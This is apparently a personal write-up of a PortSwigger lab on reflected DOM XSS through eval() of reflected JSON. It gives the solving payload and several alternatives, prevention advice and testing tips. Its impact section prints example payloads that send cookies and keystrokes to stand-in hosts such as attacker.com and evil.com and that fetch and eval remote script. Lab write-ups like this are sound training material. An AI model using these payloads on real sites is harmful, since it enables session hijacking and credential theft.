# Reflected DOM XSS

## Lab Overview
**Difficulty:** Practitioner  
**Vulnerability Type:** Reflected DOM XSS  
**Objective:** Call `alert()` function  
**Status:** ✅ Solved

---

## What is Reflected DOM XSS?

Reflected DOM XSS is a **hybrid vulnerability** that combines elements of both reflected and DOM-based XSS:

1. **Server-side reflection:** Server processes user input and reflects it in the response
2. **Client-side processing:** JavaScript reads the reflected data and processes it unsafely
3. **Dangerous sink:** JavaScript writes the data to a dangerous sink (like `eval()`)

### Attack Flow
```
User Input → Server reflects in JSON → JavaScript reads JSON → eval() processes it → XSS executes
```

---

## The Vulnerability

### The Page Structure
```html
<script src='/resources/js/searchResults.js'></script>
<script>search('search-results')</script>
```

### How It Works

**1. User searches for something:**
```
?search=test123
```

**2. Server responds with JSON:**
```json
{"results":[],"searchTerm":"test123"}
```

**3. JavaScript processes it (vulnerable code):**
```javascript
// searchResults.js likely does something like:
eval('var data = ' + jsonResponse);
```

**4. The vulnerability:**
The JavaScript uses `eval()` to parse the JSON, which can execute arbitrary code if we can break out of the string context!

---

## The Solution

### Working Payload
```
\"-alert(1)}//
```

### How It Works

**Step 1: You enter the payload**
```
\"-alert(1)}//
```

**Step 2: Server escapes the backslash and returns JSON**
```json
{"results":[],"searchTerm":"\\"-alert(1)}//"}
```

**Step 3: JavaScript evaluates it**
```javascript
eval('var data = {"results":[],"searchTerm":"\\"-alert(1)}//"}');
```

**Step 4: String interpretation**
- `\\` → Becomes a single backslash `\` (escape sequence)
- `"` → This quote is now **unescaped** (closes the string!)
- `-alert(1)` → Executed as JavaScript code
- `}` → Closes the JSON object
- `//` → Comments out the remaining `"}`

**Step 5: Execution**
```javascript
var data = {"results":[],"searchTerm":"\"}; -alert(1)//"}
                                            ↑    ↑
                                        String  Code
                                         ends   runs
```

The alert executes! ✅

---

## Payload Breakdown

| Part | Purpose | Explanation |
|------|---------|-------------|
| `\` | Backslash | Server will escape it to `\\`, creating escape confusion |
| `"` | Quote | Closes the `searchTerm` value string |
| `-alert(1)` | Payload | JavaScript code to execute (uses `-` as valid operator) |
| `}` | Close object | Closes the JSON object properly |
| `//` | Comment | Comments out the trailing `"}` to prevent syntax error |

---

## Why Each Character Matters

### The Backslash (`\`)
Without it, the quote would be escaped by the server:
```json
// Without backslash
{"searchTerm":""-alert(1)}//"}  ❌ Syntax error

// With backslash (server escapes it to \\)
{"searchTerm":"\\"-alert(1)}//"}  ✅ Quote is unescaped after eval
```

### The Quote (`"`)
Closes the string so we can inject code:
```javascript
"searchTerm":"\\"-alert(1)
              ↑  ↑
          String Code
           ends  starts
```

### The Minus Sign (`-`)
Acts as a valid JavaScript operator (unary minus):
```javascript
-alert(1)  // Valid JavaScript: negative of alert(1)'s return value
```

### The Closing Brace (`}`)
Closes the JSON object to maintain valid syntax:
```javascript
{"results":[],"searchTerm":"\\"}  // Need to close this
```

### The Comment (`//`)
Comments out the remaining characters to prevent syntax errors:
```javascript
-alert(1)}//"}  
          ^^
       Comments out the trailing "}
```

---

## Step-by-Step Solution

### Method 1: Using Search Box
1. Go to the lab page
2. Find the search box
3. Enter: `\"-alert(1)}//`
4. Click "Search" button
5. Alert dialog appears!
6. Lab is solved ✅

### Method 2: Direct URL
Navigate to:
```
https://YOUR-LAB-ID.web-security-academy.net/?search=\"-alert(1)}//
```

URL-encoded version:
```
https://YOUR-LAB-ID.web-security-academy.net/?search=%5C%22-alert(1)%7D%2F%2F
```

---

## Understanding the Escape Mechanism

### Single Backslash in JavaScript
```javascript
var x = "test\"quote";  // \" is an escaped quote
// Result: test"quote
```

### Double Backslash Confusion
```javascript
var x = "test\\"quote";  // \\ is an escaped backslash, " is unescaped!
// Result: test\"quote" ← String breaks!
```

### Our Exploit
```javascript
// Server creates this:
{"searchTerm":"\\"-alert(1)}//"}

// JavaScript interprets as:
{"searchTerm":"\" } -alert(1) is executed, rest is commented
```

---

## Why Other Payloads Don't Work

### Without Backslash
```
"-alert(1)}//
```
**Result:** Server escapes the quote: `\"-alert(1)}//`  
**Outcome:** Quote remains escaped, no breakout ❌

### Without Closing Brace
```
\"-alert(1)//
```
**Result:** `{"searchTerm":"\\"-alert(1)//"}"`  
**Outcome:** Unclosed object, syntax error ❌

### Without Comment
```
\"-alert(1)}
```
**Result:** Trailing `"}` causes syntax error ❌

---

## Alternative Payloads

If the main payload doesn't work, try:

```javascript
// With semicolon
\";alert(1)}//

// Object property injection
\"},x:alert(1),y:{z:\"

// Double backslash (if server doesn't escape)
\\"-alert(1)}//

// Alternative alert syntax
\"-window.alert(1)}//

// Using different operators
\"+alert(1)+\"
```

---

## Prevention Strategies

### For Developers

#### ❌ Vulnerable Code Pattern
```javascript
// Never use eval() with user input!
var response = '{"searchTerm":"' + userInput + '"}';
eval('var data = ' + response);
```

#### ✅ Safe Alternative 1: Use JSON.parse()
```javascript
// Use native JSON parsing
var response = '{"searchTerm":"' + escapeJSON(userInput) + '"}';
var data = JSON.parse(response);  // Safe!
```

#### ✅ Safe Alternative 2: Server-side JSON Encoding
```javascript
// Let the server create proper JSON
var data = JSON.parse(serverResponse);  // Server ensures valid JSON
```

#### ✅ Safe Alternative 3: Avoid Reflection Entirely
```javascript
// Process data without reflecting user input
const searchTerm = new URLSearchParams(location.search).get('search');
// Sanitize before use
const safe = DOMPurify.sanitize(searchTerm);
```

### Key Security Rules

1. **Never use `eval()` with user input**
2. **Always use `JSON.parse()` for JSON data**
3. **Properly escape/encode output in all contexts**
4. **Use Content Security Policy (CSP)**
5. **Validate and sanitize all user input**

---

## Real-World Impact

### Severity: High

**Attack Scenarios:**

1. **Session Hijacking**
   ```javascript
   \"-fetch('//attacker.com?c='+document.cookie)}//
   ```

2. **Credential Theft**
   ```javascript
   \"-document.body.innerHTML='<form action=//evil.com>Login...</form>'}//
   ```

3. **Keylogging**
   ```javascript
   \"-document.onkeypress=function(e){fetch('//evil.com/log?k='+e.key)}}//
   ```

4. **Remote Script Loading**
   ```javascript
   \"-fetch('//evil.com/malware.js').then(r=>r.text()).then(eval)}//
   ```

---

## Detection Techniques

### For Security Testers

**1. Identify JSON Responses**
- Search for features that return JSON
- Check API endpoints
- Look for AJAX requests

**2. Test for eval() Usage**
- Search for unique strings in JSON responses
- Check if they appear in page JavaScript
- Look for dynamic script evaluation

**3. Common Test Payloads**
```javascript
\"-alert(document.domain)}//
\"-console.log('XSS')}//
\";throw new Error('XSS')}//
```

**4. Use Browser DevTools**
- Set breakpoints on `eval()` calls
- Monitor network responses
- Check console for errors

---

## Key Differences: Reflected vs Reflected DOM XSS

| Aspect | Traditional Reflected XSS | Reflected DOM XSS |
|--------|---------------------------|-------------------|
| **Reflection Point** | HTML content | JSON/data structure |
| **Processing** | Browser renders HTML | JavaScript processes data |
| **Sink** | HTML parser | JavaScript function (`eval()`, etc.) |
| **Detection** | View page source | Check JSON responses + JavaScript |
| **Escape Context** | HTML encoding | String escaping in JavaScript |

---

## Key Takeaways

✅ **Reflected DOM XSS** - Server reflects data that JavaScript processes unsafely  
✅ **JSON + eval()** - Common vulnerable pattern  
✅ **Backslash escape confusion** - `\\` becomes `\`, leaving quote unescaped  
✅ **Payload structure** - Must break string, execute code, close object, comment rest  
✅ **Prevention** - Use `JSON.parse()` instead of `eval()`  
✅ **Character precision** - Every character in `\"-alert(1)}//` serves a purpose  

---

## References

- [PortSwigger: Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- [OWASP: DOM Based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)
- [MDN: eval() is dangerous](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval#never_use_eval!)
- [JSON.parse() vs eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse)

---

**Date Completed:** February 2, 2026  
**Working Payload:** `\"-alert(1)}//`  
**Key Technique:** Backslash escape confusion to break out of JSON string context in eval()
